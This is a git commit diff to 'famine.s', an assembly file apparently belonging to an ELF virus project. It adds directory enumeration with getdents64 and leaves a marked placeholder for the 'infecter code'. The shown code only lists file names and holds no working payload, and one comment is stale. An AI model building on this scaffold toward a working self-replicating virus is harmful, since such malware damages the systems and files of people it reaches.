cfc6ae537a4528e80d2effff20002f9b82740304
cdrouet <corentin.drouet@hotmail.fr>
2017-11-29 14:24:52 +0100

    getdents implemented

--- famine.s
+++ famine.s
@@ -15,14 +15,15 @@ _start:
 
 _calculate_start_of_virus:
 	xor r10, r10 ; r10 = 0
-	lea r10, [rel _size_end] ; r10 = &_size_end
-	sub r10, [rel _start] ; r10 -= &start
-	mov QWORD [rsp + 280], r10 ; virus size = r10
+;	lea r10, [rel _size_end] ; r10 = &_size_end
+;	sub r10, [rel _start] ; r10 -= &start
+;	mov QWORD [rsp + 280], r10 ; virus size = r10
 
 _open_dir:
 	push 0x00002f2e ; push "./"
 	mov rdi, rsp ; mov the stack address on rdi, he first argument
-	mov rsi, 0x2 ; flag for open
+	xor rsi, rsi ; rsi = 0
+	xor rdx, rdx ; rdx = 0
 	mov rax, 0x2 ; open syscall number
 	syscall ; open
 	pop rdi ; we pushed, so we pop
@@ -31,13 +32,52 @@ _open_dir:
 	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)
 
 _file_loop:
-	xor rdx, rdx ; rdx = 0, set the count of getdents to 0, cose it's ignored
+	mov rdx, 280 ; rdx = 0, set the count of getdents to 0, cose it's ignored
 	mov rdi, QWORD [rsp + 288] ; mov the fd to the first argument
 	mov rsi, rsp ; mov the stack pointer to the second argument
-	mov rax, 78 ; getdents syscall number
+	mov rax, 217 ; getdents64 syscall number
 	syscall
+	cmp rax, 0 ; we check if getdents64 read something, if not, we are at the end of dir or their is an error
+	jle _end
+	mov r10, rax ; mov to r10 the number of bytes readed
+	add r10, rsp ; set the maximum theoric address for the readed datas (start buffer address + number of bytes read)
+	mov rsi, rsp ; initialize rsi with our buffer address on the stack
+
+_read_data:
+	cmp rsi, r10 ; r10 is the address of the end of the buffer, so we check if our address is too far in memory
+	jge _file_loop ; and we jump to read again the dir datas, to see if their is anothers datas to treat
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; here is a part to print the ;
+;  datas. replace it by the   ;
+;        infecter code        ;
+	mov rdi, 1 ; write(1, ..., ...) ;
+	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
+	xor rdx, rdx
+
+; counting string len
+_count_str_size:
+	cmp BYTE [rsi + rdx], 0
+	je _continue
+	inc rdx
+	jmp _count_str_size
+
+_continue:
+	mov rax, 1 ; write syscall number
+	syscall
+	sub rsi, 19 ; decrease offset
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+	xor r11, r11 ; clear r11
+	mov r11w, WORD [rsi + 16] ; in dirent struct, at offset 16, their is a short (2 bytes) describing the len of the file
+	add rsi, r11 ; we add this len on our current struct address to access next struct
+	jmp _read_data
 	
 _end:
+	mov rax, 60 ; exit syscall number, will not be in final code
+	mov rdi, 0
+	syscall
+	leave
 	ret
 
 _size_end:
